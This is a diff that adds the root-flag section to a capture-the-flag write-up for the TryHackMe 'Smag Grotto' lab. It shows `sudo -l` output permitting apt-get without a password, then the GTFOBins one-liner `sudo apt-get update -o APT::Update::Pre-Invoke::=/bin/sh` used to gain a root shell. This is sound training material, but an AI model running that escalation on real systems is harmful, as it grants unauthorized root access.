@@ -80,6 +80,21 @@ and are able to log in. Finally, we can print the contents of the `user.txt` fil
 
 What is the root flag?
 -----------------------------------------------------------------------------------------
+Finally, we want to perform privilege escalation to extend our user rights to *root*.
+For that, it is always useful to investigate the default *sudo* entries for our current
+user with `sudo -l`. Here, we can read from the output, that `apt-get` is allowed with
+sudo for jake:
+```
+Matching Defaults entries for jake on smag:
+  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jake may run the following commands on smag:
+  (ALL : ALL) NOPASSWD: /usr/bin/apt-get
+```
+For that instance, we can then proceed to look up an exectuable to escalate privileges
+on GTFOBins [^3] for `apt-get`. From the currated list, we choose 
+`sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` and are able to gain *root*.
+Finally, we can print the contents of the `/root/root.txt` file.
 
 [^1]: https://tryhackme.com/room/smaggrotto
 [^2]: https://www.revshells.com/
